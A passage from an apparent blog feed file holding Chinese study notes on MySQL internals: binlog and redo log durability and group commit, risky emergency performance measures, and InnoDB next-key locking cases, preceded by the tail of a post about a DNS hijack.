查询功能进行查询，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220820101422.png" alt=""><br>广东电信，竟然把 DNS 给劫持了，这个 <code>127.0.0.1</code> 显然是运营商解析的。</p><p>于是将正确的地址，配置在 hosts 之后，再次通过图床进行上传，就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23 MySQL是怎么保证数据不丢的</title>
      <link href="/how-does-mysql-ensure-that-data-is-not-lost/"/>
      <url>/how-does-mysql-ensure-that-data-is-not-lost/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 binlog 的写入机制</li><li>了解 redo log 的写入机制</li></ul><a id="more"></a><h2 id="binlog-的写入机制"><a href="#binlog-的写入机制" class="headerlink" title="binlog 的写入机制"></a>binlog 的写入机制</h2><p>其实，binlog 的写入逻辑比较简单：事务执行过程中，先把日志写到 binlog cache，事务提交的时候，再把 binlog cache 写到 binlog 文件中。</p><p>一个事务的 binlog 是不能被拆开的，因此不论这个事务多大，也要确保一次性写入。这就涉及到了 binlog cache 的保存问题。</p><p>系统给 binlog cache 分配了一片内存，每个线程一个，参数 binlog_cache_size 用于控制单个线程内 binlog cache 所占内存的大小。如果超过了这个参数规定的大小，就要暂存到磁盘。</p><p>事务提交的时候，执行器把 binlog cache 里的完整事务写入到 binlog 中，并清空 binlog cache。状态如图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819091633.png" alt=""><br>可以看到，每个线程有自己 binlog cache，但是共用同一份 binlog 文件。</p><ul><li>图中的 write，指的就是指把日志写入到文件系统的 page cache，并没有把数据持久化到磁盘，所以速度比较快。</li><li>图中的 fsync，才是将数据持久化到磁盘的操作。一般情况下，我们认为 fsync 才占磁盘的 IOPS。</li></ul><p>write 和 fsync 的时机，是由参数 sync_binlog 控制的：</p><ol><li>sync_binlog=0 的时候，表示每次提交事务都只 write，不 fsync；</li><li>sync_binlog=1 的时候，表示每次提交事务都会执行 fsync；</li><li>sync_binlog=N(N&gt;1) 的时候，表示每次提交事务都 write，但累积 N 个事务后才 fsync。</li></ol><p>因此，在出现 IO 瓶颈的场景里，将 sync_binlog 设置成一个比较大的值，可以提升性能。在实际的业务场景中，考虑到丢失日志量的可控性，一般不建议将这个参数设成 0，比较常见的是将其设置为 100~1000 中的某个数值。</p><p>但是，将 sync_binlog 设置为 N，对应的风险是：如果主机发生异常重启，会丢失最近 N 个事务的 binlog 日志。</p><h2 id="redo-log-的写入机制"><a href="#redo-log-的写入机制" class="headerlink" title="redo log 的写入机制"></a>redo log 的写入机制</h2><p>事务在执行过程中，生成的 redo log 是要先写到 redo log buffer 的。</p><p>那么 redo log buffer 里面的内容，是不是每次生成后都要直接持久化到磁盘呢？</p><p>答案是，不需要。</p><p>如果事务执行期间 MySQL 发生异常重启，那这部分日志就丢了。由于事务并没有提交，所以这时日志丢了也不会有损失。</p><p>那么，另外一个问题是，事务还没提交的时候，redo log buffer 中的部分日志有没有可能被持久化到磁盘呢？</p><p>答案是，确实会有。</p><p>这个问题，要从 redo log 可能存在的三种状态说起。这三种状态，对应的就是图 2 中的三个颜色块。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819091645.png" alt=""><br>这三种状态分别是：</p><ol><li>存在 redo log buffer 中，物理上是在 MySQL 进程内存中，就是图中的红色部分；</li><li>写到磁盘 (write)，但是没有持久化（fsync)，物理上是在文件系统的 page cache 里面，也就是图中的黄色部分；</li><li>持久化到磁盘，对应的是 hard disk，也就是图中的绿色部分。</li></ol><p>日志写到 redo log buffer 是很快的，wirte 到 page cache 也差不多，但是持久化到磁盘的速度就慢多了。</p><p>为了控制 redo log 的写入策略，InnoDB 提供了 innodb_flush_log_at_trx_commit 参数，它有三种可能取值：</p><ol><li>设置为 0 的时候，表示每次事务提交时都只是把 redo log 留在 redo log buffer 中 </li><li>设置为 1 的时候，表示每次事务提交时都将 redo log 直接持久化到磁盘</li><li>设置为 2 的时候，表示每次事务提交时都只是把 redo log 写到 page cache</li></ol><p>InnoDB 有一个后台线程，每隔 1 秒，就会把 redo log buffer 中的日志，调用 write 写到文件系统的 page cache，然后调用 fsync 持久化到磁盘。</p><p>注意，事务执行中间过程的 redo log 也是直接写在 redo log buffer 中的，这些 redo log 也会被后台线程一起持久化到磁盘。也就是说，一个没有提交的事务的 redo log，也是可能已经持久化到磁盘的。</p><p>实际上，除了后台线程每秒一次的轮询操作外，还有两种场景会让一个没有提交的事务的 redo log 写入到磁盘中。</p><ol><li>一种是，redo log buffer 占用的空间即将达到 innodb_log_buffer_size 一半的时候，后台线程会主动写盘。注意，由于这个事务并没有提交，所以这个写盘动作只是 write，而没有调用 fsync，也就是只留在了文件系统的 page cache。</li><li>另一种是，并行的事务提交的时候，顺带将这个事务的 redo log buffer 持久化到磁盘。假设一个事务 A 执行到一半，已经写了一些 redo log 到 buffer 中，这时候有另外一个线程的事务 B 提交，如果 innodb_flush_log_at_trx_commit 设置的是 1，那么按照这个参数的逻辑，事务 B 要把 redo log buffer 里的日志全部持久化到磁盘。这时候，就会带上事务 A 在 redo log buffer 里的日志一起持久化到磁盘。</li></ol><p>这里需要说明的是，我们介绍两阶段提交的时候说过，时序上 redo log 先 prepare， 再写 binlog，最后再把 redo log commit。</p><p>如果把 innodb_flush_log_at_trx_commit 设置成 1，那么 redo log 在 prepare 阶段就要持久化一次，因为有一个崩溃恢复逻辑是要依赖于 prepare 的 redo log，再加上 binlog 来恢复的。</p><p>每秒一次后台轮询刷盘，再加上崩溃恢复这个逻辑，InnoDB 就认为 redo log 在 commit 的时候就不需要 fsync 了，只会 write 到文件系统的 page cache 中就够了。</p><p>通常我们说 MySQL 的“双 1”配置，指的就是 sync_binlog 和 innodb_flush_log_at_trx_commit 都设置成 1。也就是说，一个事务完整提交前，需要等待两次刷盘，一次是 redo log（prepare 阶段），一次是 binlog。</p><p>这时候，你可能有一个疑问，这意味着我从 MySQL 看到的 TPS 是每秒两万的话，每秒就会写四万次磁盘。但是，我用工具测试出来，磁盘能力也就两万左右，怎么能实现两万的 TPS？</p><p>解释这个问题，就要用到组提交（group commit）机制了。</p><p>这里，我需要先和你介绍日志逻辑序列号（log sequence number，LSN）的概念。LSN 是单调递增的，用来对应 redo log 的一个个写入点。每次写入长度为 length 的 redo log， LSN 的值就会加上 length。</p><p>LSN 也会写到 InnoDB 的数据页中，来确保数据页不会被多次执行重复的 redo log。关于 LSN 和 redo log、checkpoint 的关系，我会在后面的文章中详细展开。</p><p>如图 3 所示，是三个并发事务 (trx1, trx2, trx3) 在 prepare 阶段，都写完 redo log buffer，持久化到磁盘的过程，对应的 LSN 分别是 50、120 和 160。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819091659.png" alt=""></p><p>从图中可以看到：</p><ol><li>trx1 是第一个到达的，会被选为这组的 leader；</li><li>等 trx1 要开始写盘的时候，这个组里面已经有了三个事务，这时候 LSN 也变成了 160；</li><li>trx1 去写盘的时候，带的就是 LSN=160，因此等 trx1 返回时，所有 LSN 小于等于 160 的 redo log，都已经被持久化到磁盘；</li><li>这时候 trx2 和 trx3 就可以直接返回了。</li></ol><p>所以，一次组提交里面，组员越多，节约磁盘 IOPS 的效果越好。但如果只有单线程压测，那就只能老老实实地一个事务对应一次持久化操作了。</p><p>在并发更新场景下，第一个事务写完 redo log buffer 以后，接下来这个 fsync 越晚调用，组员可能越多，节约 IOPS 的效果就越好。</p><p>为了让一次 fsync 带的组员更多，MySQL 有一个很有趣的优化：拖时间。在介绍两阶段提交的时候，我曾经给你画了一个图，现在我把它截过来。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819091713.png" alt=""><br>图中，我把“写 binlog”当成一个动作。但实际上，写 binlog 是分成两步的：</p><p>先把 binlog 从 binlog cache 中写到磁盘上的 binlog 文件；<br>调用 fsync 持久化。<br>MySQL 为了让组提交的效果更好，把 redo log 做 fsync 的时间拖到了步骤 1 之后。也就是说，上面的图变成了这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819091729.png" alt=""><br>这么一来，binlog 也可以组提交了。在执行图 5 中第 4 步把 binlog fsync 到磁盘时，如果有多个事务的 binlog 已经写完了，也是一起持久化的，这样也可以减少 IOPS 的消耗。</p><p>不过通常情况下第 3 步执行得会很快，所以 binlog 的 write 和 fsync 间的间隔时间短，导致能集合到一起持久化的 binlog 比较少，因此 binlog 的组提交的效果通常不如 redo log 的效果那么好。</p><p>如果你想提升 binlog 组提交的效果，可以通过设置 binlog_group_commit_sync_delay 和 binlog_group_commit_sync_no_delay_count 来实现。</p><ol><li>binlog_group_commit_sync_delay 参数，表示延迟多少微秒后才调用 fsync;</li><li>binlog_group_commit_sync_no_delay_count 参数，表示累积多少次以后才调用 fsync。<br>这两个条件是或的关系，也就是说只要有一个满足条件就会调用 fsync。</li></ol><p>所以，当 binlog_group_commit_sync_delay 设置为 0 的时候，binlog_group_commit_sync_no_delay_count 也无效了。</p><p>之前有同学在评论区问到，WAL 机制是减少磁盘写，可是每次提交事务都要写 redo log 和 binlog，这磁盘读写次数也没变少呀？</p><p>现在你就能理解了，WAL 机制主要得益于两个方面：</p><ol><li>redo log 和 binlog 都是顺序写，磁盘的顺序写比随机写速度要快；</li><li>组提交机制，可以大幅度降低磁盘的 IOPS 消耗。</li></ol><p>分析到这里，我们再来回答这个问题：如果你的 MySQL 现在出现了性能瓶颈，而且瓶颈在 IO 上，可以通过哪些方法来提升性能呢？</p><p>针对这个问题，可以考虑以下三种方法：</p><ol><li>设置 binlog_group_commit_sync_delay 和 binlog_group_commit_sync_no_delay_count 参数，减少 binlog 的写盘次数。这个方法是基于“额外的故意等待”来实现的，因此可能会增加语句的响应时间，但没有丢失数据的风险。</li><li>将 sync_binlog 设置为大于 1 的值（比较常见是 100~1000）。这样做的风险是，主机掉电时会丢 binlog 日志。</li><li>将 innodb_flush_log_at_trx_commit 设置为 2。这样做的风险是，主机掉电的时候会丢数据。</li></ol><p>我不建议你把 innodb_flush_log_at_trx_commit 设置成 0。因为把这个参数设置成 0，表示 redo log 只保存在内存中，这样的话 MySQL 本身异常重启也会丢数据，风险太大。而 redo log 写到文件系统的 page cache 的速度也是很快的，所以将这个参数设置成 2 跟设置成 0 其实性能差不多，但这样做 MySQL 异常重启时就不会丢数据了，相比之下风险会更小。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>只要 redo log 和 binlog 保证持久化到磁盘，就能确保 MySQL 异常重启后，数据可以恢复。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22 MySQL有哪些“饮鸩止渴”提高性能的方法</title>
      <link href="/what-are-the-ways-to-improve-performance-of-mysql-by-drinking-poison-to-quench-thirst/"/>
      <url>/what-are-the-ways-to-improve-performance-of-mysql-by-drinking-poison-to-quench-thirst/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解频繁建立连接所带来的问题</li><li>了解慢查询的性能问题</li></ul><a id="more"></a><h2 id="短连接风暴"><a href="#短连接风暴" class="headerlink" title="短连接风暴"></a>短连接风暴</h2><p>正常的短连接模式就是连接到数据库后，执行很少的 SQL 语句就断开，下次需要的时候再重连。如果使用的是短连接，在业务高峰期的时候，就可能出现连接数突然暴涨的情况。</p><p>MySQL 建立连接的过程，成本是很高的。除了正常的网络连接三次握手外，还需要做登录权限判断和获得这个连接的数据读写权限。在数据库压力比较小的时候，这些额外的成本并不明显。</p><p>但是，短连接模型存在一个风险，就是一旦数据库处理得慢一些，连接数就会暴涨。max_connections 参数，用来控制一个 MySQL 实例同时存在的连接数的上限，超过这个值，系统就会拒绝接下来的连接请求，并报错提示“Too many connections”。对于被拒绝连接的请求来说，从业务角度看就是数据库不可用。</p><p>在机器负载比较高的时候，处理现有请求的时间变长，每个连接保持的时间也更长。这时，再有新建连接的话，就可能会超过 max_connections 的限制。</p><p>碰到这种情况时，一个比较自然的想法，就是调高 max_connections 的值。但这样做是有风险的。因为设计 max_connections 这个参数的目的是想保护 MySQL，如果我们把它改得太大，让更多的连接都可以进来，那么系统的负载可能会进一步加大，大量的资源耗费在权限验证等逻辑上，结果可能是适得其反，已经连接的线程拿不到 CPU 资源去执行业务的 SQL 请求。</p><p>那么这种情况下，你还有没有别的建议呢？我这里还有两种方法，但要注意，这些方法都是有损的。</p><h3 id="先处理掉那些占着连接但是不工作的线程"><a href="#先处理掉那些占着连接但是不工作的线程" class="headerlink" title="先处理掉那些占着连接但是不工作的线程"></a>先处理掉那些占着连接但是不工作的线程</h3><p>max_connections 的计算，不是看谁在 running，是只要连着就占用一个计数位置。对于那些不需要保持的连接，我们可以通过 kill connection 主动踢掉。这个行为跟事先设置 wait_timeout 的效果是一样的。设置 wait_timeout 参数表示的是，一个线程空闲 wait_timeout 这么多秒之后，就会被 MySQL 直接断开连接。</p><p>从数据库端主动断开连接可能是有损的，尤其是有的应用端收到这个错误后，不重新连接，而是直接用这个已经不能用的句柄重试查询。这会导致从应用端看上去，“MySQL 一直没恢复”。</p><h3 id="减少连接过程的消耗"><a href="#减少连接过程的消耗" class="headerlink" title="减少连接过程的消耗"></a>减少连接过程的消耗</h3><p>有的业务代码会在短时间内先大量申请数据库连接做备用，如果现在数据库确认是被连接行为打挂了，那么一种可能的做法，是让数据库跳过权限验证阶段。</p><p>跳过权限验证的方法是：重启数据库，并使用–skip-grant-tables 参数启动。这样，整个 MySQL 会跳过所有的权限验证阶段，包括连接过程和语句执行过程在内。</p><p>但是，这种方法特别符合我们标题里说的“饮鸩止渴”，风险极高，是我特别不建议使用的方案。尤其你的库外网可访问的话，就更不能这么做了。</p><p>在 MySQL 8.0 版本里，如果你启用–skip-grant-tables 参数，MySQL 会默认把 –skip-networking 参数打开，表示这时候数据库只能被本地的客户端连接。可见，MySQL 官方对 skip-grant-tables 这个参数的安全问题也很重视。</p><p>除了短连接数暴增可能会带来性能问题外，实际上，我们在线上碰到更多的是查询或者更新语句导致的性能问题。其中，查询问题比较典型的有两类，一类是由新出现的慢查询导致的，一类是由 QPS（每秒查询数）突增导致的。而关于更新语句导致的性能问题，我会在下一篇文章和你展开说明。</p><h2 id="慢查询性能问题"><a href="#慢查询性能问题" class="headerlink" title="慢查询性能问题"></a>慢查询性能问题</h2><p>在 MySQL 中，会引发性能问题的慢查询，大体有以下三种可能：</p><ul><li>索引没有设计好</li><li>SQL 语句没写好</li><li>MySQL 选错了索引</li></ul><h3 id="可能一"><a href="#可能一" class="headerlink" title="可能一"></a>可能一</h3><p>这种场景一般就是通过紧急创建索引来解决。MySQL 5.6 版本以后，创建索引都支持 Online DDL 了，对于那种高峰期数据库已经被这个语句打挂了的情况，最高效的做法就是直接执行 alter table 语句。</p><h3 id="可能二"><a href="#可能二" class="headerlink" title="可能二"></a>可能二</h3><p>比如，我们犯了在第 18 篇文章《为什么这些 SQL 语句逻辑相同，性能却差异巨大？》中提到的那些错误，导致语句没有使用上索引。</p><p>这时，我们可以通过改写 SQL 语句来处理。MySQL 5.7 提供了 query_rewrite 功能，可以把输入的一种语句改写成另外一种模式。</p><h3 id="可能三"><a href="#可能三" class="headerlink" title="可能三"></a>可能三</h3><p>还有一个可能就是碰上了我们在第 10 篇文章《MySQL 为什么有时候会选错索引？》中提到的情况，MySQL 选错了索引。</p><p>这时候，应急方案就是给这个语句加上 force index。</p><p>同样地，使用查询重写功能，给原来的语句加上 force index，也可以解决这个问题。</p><h2 id="QPS-突增问题"><a href="#QPS-突增问题" class="headerlink" title="QPS 突增问题"></a>QPS 突增问题</h2><p>有时候由于业务突然出现高峰，或者应用程序 bug，导致某个语句的 QPS 突然暴涨，也可能导致 MySQL 压力过大，影响服务。</p><p>对于这类问题，最理想的情况是让业务把这个功能下掉，服务自然就会恢复。</p><ol><li>一种是由全新业务的 bug 导致的。假设你的 DB 运维是比较规范的，也就是说白名单是一个个加的。这种情况下，如果你能够确定业务方会下掉这个功能，只是时间上没那么快，那么就可以从数据库端直接把白名单去掉。</li><li>如果这个新功能使用的是单独的数据库用户，可以用管理员账号把这个用户删掉，然后断开现有连接。这样，这个新功能的连接不成功，由它引发的 QPS 就会变成 0。</li><li>如果这个新增的功能跟主体功能是部署在一起的，那么我们只能通过处理语句来限制。这时，我们可以使用上面提到的查询重写功能，把压力最大的 SQL 语句直接重写成”select 1”返回。</li></ol><p>当然，这个操作的风险很高，需要你特别细致。它可能存在两个副作用：</p><ol><li>如果别的功能里面也用到了这个 SQL 语句模板，会有误伤；</li><li>很多业务并不是靠这一个语句就能完成逻辑的，所以如果单独把这一个语句以 select 1 的结果返回的话，可能会导致后面的业务逻辑一起失败。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>实际开发中，需要尽量避免一些低效的方法，比如避免大量地使用短连接</li><li>没有完美的解决方案，如果有的话，肯定也不至于等到问题已经发生了才上场</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21 为什么我只改一行的语句，锁这么多</title>
      <link href="/why-do-I-only-change-one-line-of-the-statement-so-many-locks/"/>
      <url>/why-do-I-only-change-one-line-of-the-statement-so-many-locks/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 next-key lock 的加锁规则</li><li>通过各种案例加深对 next-key lock 的理解</li></ul><a id="more"></a><p>下面的示例都是基于表 t 进行展开的，建表和初始化语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;c&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;d&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;c&#96; (&#96;c&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br><span class="line"> </span><br><span class="line">insert into t values(0,0,0),(5,5,5),</span><br><span class="line">(10,10,10),(15,15,15),(20,20,20),(25,25,25);</span><br></pre></td></tr></table></figure><p>下面所有案例都是在可重复读隔离级别 (repeatable-read) 下验证的。同时，可重复读隔离级别遵守两阶段锁协议，所有加锁的资源，都是在事务提交或者回滚的时候才释放的。</p><p>加锁规则：</p><ol><li>原则 1：加锁的基本单位是 next-key lock。希望你还记得，next-key lock 是前开后闭区间。</li><li>原则 2：查找过程中访问到的对象才会加锁。</li><li>优化 1：索引上的等值查询，给唯一索引加锁的时候，next-key lock 退化为行锁。</li><li>优化 2：索引上的等值查询，向右遍历时且最后一个值不满足等值条件的时候，next-key lock 退化为间隙锁。</li><li>一个 bug：唯一索引上的范围查询会访问到不满足条件的第一个值为止。</li></ol><h2 id="案例一：等值查询间隙锁"><a href="#案例一：等值查询间隙锁" class="headerlink" title="案例一：等值查询间隙锁"></a>案例一：等值查询间隙锁</h2><p>等值条件操作间隙：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085324.png" alt=""><br>当使用 <code>update t set d=d+1 where id = 7</code> 时，就给表 t 的 6 个记录加上了行锁，还同时加了 7 个间隙锁。</p><p>由于表 t 中没有 id=7 的记录，所以用我们上面提到的加锁规则判断一下的话：</p><ol><li>根据原则 1，加锁单位是 next-key lock，session A 加锁范围就是 (5,10]；</li><li>同时根据优化 2，这是一个等值查询 (id=7)，而 id=10 不满足查询条件，next-key lock 退化成间隙锁，因此最终加锁的范围是 (5,10)。</li></ol><p>所以，session B 要往这个间隙里面插入 id=8 的记录会被锁住，但是 session C 修改 id=10 这行是可以的。</p><h2 id="案例二：非唯一索引等值锁"><a href="#案例二：非唯一索引等值锁" class="headerlink" title="案例二：非唯一索引等值锁"></a>案例二：非唯一索引等值锁</h2><p>覆盖索引上的锁：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085339.png" alt=""><br> session A 的查询是覆盖索引，并且使用 lock in share mode，因此索引 c 上 c=5 的这一行会被加上读锁。</p><ol><li>根据原则 1，加锁单位是 next-key lock，因此会给 (0,5] 加上 next-key lock。</li><li>要注意 c 是普通索引，因此仅访问 c=5 这一条记录是不能马上停下来的，需要向右遍历，查到 c=10 才放弃。根据原则 2，访问到的都要加锁，因此要给 (5,10] 加 next-key lock。</li><li>但是同时这个符合优化 2：等值判断，向右遍历，最后一个值不满足 c=5 这个等值条件，因此退化成间隙锁 (5,10)。</li><li>根据原则 2 ，只有访问到的对象才会加锁，这个查询使用覆盖索引，并不需要访问主键索引，所以主键索引上没有加任何锁，这就是为什么 session B 的 update 语句可以执行完成。</li></ol><p>由于session C 要插入一个 (7,7,7) 的记录，因此会被 session A 的间隙锁 (5,10) 锁住。</p><h2 id="案例三：主键索引范围锁"><a href="#案例三：主键索引范围锁" class="headerlink" title="案例三：主键索引范围锁"></a>案例三：主键索引范围锁</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t where id&#x3D;10 for update;</span><br><span class="line">mysql&gt; select * from t where id&gt;&#x3D;10 and id&lt;11 for update;</span><br></pre></td></tr></table></figure><p>在逻辑上，这两条查语句肯定是等价的，但是它们的加锁规则不太一样。现在，我们就让 session A 执行第二个查询语句，来看看加锁效果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085404.png" alt=""></p><ol><li>开始执行的时候，要找到第一个 id=10 的行，因此本该是 next-key lock(5,10]。 根据优化 1， 主键 id 上的等值条件，退化成行锁，只加了 id=10 这一行的行锁。</li><li>范围查找就往后继续找，找到 id=15 这一行停下来，因此需要加 next-key lock(10,15]。</li></ol><p>所以，session A 这时候锁的范围就是主键索引上，行锁 id=10 和 next-key lock(10,15]。这样，session B 和 session C 的结果你就能理解了。</p><p>需要注意的是，首次 session A 定位查找 id=10 的行的时候，是当做等值查询来判断的，而向右扫描到 id=15 的时候，用的是范围查询判断。</p><h2 id="案例四：非唯一索引范围锁"><a href="#案例四：非唯一索引范围锁" class="headerlink" title="案例四：非唯一索引范围锁"></a>案例四：非唯一索引范围锁</h2><p>案例四和案例三很像，区别在于案例四使用的是非唯一索引，也就是不会触发优化规则。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085453.png" alt=""></p><p>在第一次用 c=10 定位记录的时候，索引 c 上加了 (5,10] 这个 next-key lock 后，由于索引 c 是非唯一索引，没有优化规则，也就是说不会蜕变为行锁，因此最终 sesion A 加的锁是，索引 c 上的 (5,10] 和 (10,15] 这两个 next-key lock。</p><p>所以从结果上来看，sesson B 要插入（8,8,8) 的这个 insert 语句时就被堵住了。</p><p>这里需要扫描到 c=15 才停止扫描，是合理的，因为 InnoDB 要扫到 c=15，才知道不需要继续往后找了。</p><h2 id="案例五：唯一索引范围锁-bug"><a href="#案例五：唯一索引范围锁-bug" class="headerlink" title="案例五：唯一索引范围锁 bug"></a>案例五：唯一索引范围锁 bug</h2><p>前面的四个案例，我们已经用到了加锁规则中的两个原则和两个优化，接下来再看一个关于加锁规则中 bug 的案例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085413.png" alt=""></p><p>session A 是一个范围查询，按照原则 1 的话，应该是索引 id 上只加 (10,15] 这个 next-key lock，并且因为 id 是唯一键，所以循环判断到 id=15 这一行就应该停止了。</p><p>但是实现上，InnoDB 会往前扫描到第一个不满足条件的行为止，也就是 id=20。而且由于这是个范围扫描，因此索引 id 上的 (15,20] 这个 next-key lock 也会被锁上。</p><p>所以你看到了，session B 要更新 id=20 这一行，是会被锁住的。同样地，session C 要插入 id=16 的一行，也会被锁住。</p><h2 id="案例六：非唯一索引上存在”等值”的例子"><a href="#案例六：非唯一索引上存在”等值”的例子" class="headerlink" title="案例六：非唯一索引上存在”等值”的例子"></a>案例六：非唯一索引上存在”等值”的例子</h2><p>接下来的例子，是为了更好地说明“间隙”这个概念。这里，我给表 t 插入一条新记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into t values(30,10,30);</span><br></pre></td></tr></table></figure><p>新插入的这一行，c的值也是 10，因为 c 是非唯一索引，而非唯一索引上包含主键的值。那么，这时候索引 c 上的间隙是什么状态了呢？</p><p>索引c 对应的主键的值如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085509.png" alt=""><br>可以看到，虽然有两个 c=10，但是它们的主键值 id 是不同的（分别是 10 和 30），因此这两个 c=10 的记录之间，也是有间隙的。</p><p>为了跟间隙锁的开区间形式进行区别，我用 (c=10,id=30) 这样的形式，来表示索引上的一行。</p><p>案例六使用 delete 语句来验证。delete 语句加锁的逻辑，其实跟 select … for update 是类似的，也是遵守两个”原则“、两个”优化“以及一个”bug“。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085523.png" alt=""></p><p>这时，session A 在遍历的时候，先访问第一个 c=10 的记录。同样地，根据原则 1，这里加的是 (c=5,id=5) 到 (c=10,id=10) 这个 next-key lock。</p><p>然后，session A 向右查找，直到碰到 (c=15,id=15) 这一行，循环才结束。根据优化 2，这是一个等值查询，向右查找到了不满足条件的行，所以会退化成 (c=10,id=10) 到 (c=15,id=15) 的间隙锁。</p><p>也就是说，这个 delete 语句在索引 c 上的加锁范围，就是下图中蓝色区域覆盖的部分。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085545.png" alt=""></p><p>这个蓝色区域左右两边都是虚线，表示开区间，即 (c=5,id=5) 和 (c=15,id=15) 这两行上都没有锁。</p><h2 id="案例七：limit-语句加锁"><a href="#案例七：limit-语句加锁" class="headerlink" title="案例七：limit 语句加锁"></a>案例七：limit 语句加锁</h2><p>案例六的对照案例：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085558.png" alt=""></p><p>这个例子里，session A 的 delete 语句加了 limit 2。你知道表 t 里 c=10 的记录其实只有两条，因此加不加 limit 2，删除的效果都是一样的，但是加锁的效果却不同。可以看到，session B 的 insert 语句执行通过了，跟案例六的结果不同。</p><p>这是因为，案例七里的 delete 语句明确加了 limit 2 的限制，因此在遍历到 (c=10, id=30) 这一行之后，满足条件的语句已经有两条，循环就结束了。</p><p>也就是如果这里的 delete 语句没有加上 limit 2 这个限制，后面的 insert 语句是会被锁住的，因为c 是普通索引，因此仅访问 c=10 这一条记录是不能马上停下来的，需要向右遍历，查到 c=15 才放弃。根据原则 2，访问到的都要加锁，因此要给 (10,15] 加 next-key lock。</p><p>因此，索引 c 上的加锁范围就变成了从（c=5,id=5) 到（c=10,id=30) 这个前开后闭区间，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085609.png" alt=""></p><p>可以看到，(c=10,id=30）之后的这个间隙并没有在加锁范围里，因此 insert 语句插入 c=12 是可以执行成功的。</p><p>这个例子对我们实践的指导意义就是，在删除数据的时候尽量加 limit。这样不仅可以控制删除数据的条数，让操作更安全，还可以减小加锁的范围。</p><h2 id="案例八：一个死锁的例子"><a href="#案例八：一个死锁的例子" class="headerlink" title="案例八：一个死锁的例子"></a>案例八：一个死锁的例子</h2><p>next-key lock 实际上是间隙锁和行锁加起来的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816085721.png" alt=""></p><ol><li>session A 启动事务后执行查询语句加 lock in share mode，在索引 c 上加了 next-key lock(5,10] 和间隙锁 (10,15)；</li><li>session B 的 update 语句也要在索引 c 上加 next-key lock(5,10] ，进入锁等待；</li><li>然后 session A 要再插入 (8,8,8) 这一行，被 session B 的间隙锁锁住。由于出现了死锁，InnoDB 让 session B 回滚。</li></ol><p>你可能会问，session B 的 next-key lock 不是还没申请成功吗？</p><p>其实是这样的，session B 的“加 next-key lock(5,10] ”操作，实际上分成了两步，先是加 (5,10) 的间隙锁，加锁成功；然后加 c=10 的行锁，这时候才被锁住的。</p><p>也就是说，我们在分析加锁规则的时候可以用 next-key lock 来分析。但是要知道，具体执行的时候，是要分成间隙锁和行锁两段来执行的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>lock in share mode 只锁覆盖索引; for update 